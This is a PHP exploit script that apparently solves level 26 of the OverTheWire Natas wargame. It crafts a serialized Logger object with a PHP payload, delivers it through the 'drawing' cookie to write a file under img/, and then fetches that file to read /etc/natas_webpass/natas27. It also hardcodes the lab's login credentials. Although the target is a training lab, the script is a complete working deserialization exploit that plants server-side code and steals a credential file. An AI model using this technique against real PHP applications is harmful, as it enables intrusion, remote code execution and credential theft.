<?php

$random = (string)rand();

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct() {
        $random = $GLOBALS['random'];
        $this->logFile = "img/$random.php";
        $this->initMsg = "hello";
        $this->exitMsg = "<?php include('/etc/natas_webpass/natas27'); ?>";
    }
}

$x = new Logger();
//var_dump($x);
//echo json_encode(serialize($x));
$drawing = urlencode(base64_encode(serialize($x)));

$c = curl_init('http://natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T@natas26.natas.labs.overthewire.org');
//curl_setopt($c, CURLOPT_VERBOSE, 1);
curl_setopt($c, CURLOPT_COOKIE, "drawing=$drawing");
//curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_exec($c);
curl_close($c);

$password = file_get_contents("http://natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T@natas26.natas.labs.overthewire.org/img/$random.php");

echo "password for natas27 is $password";
?>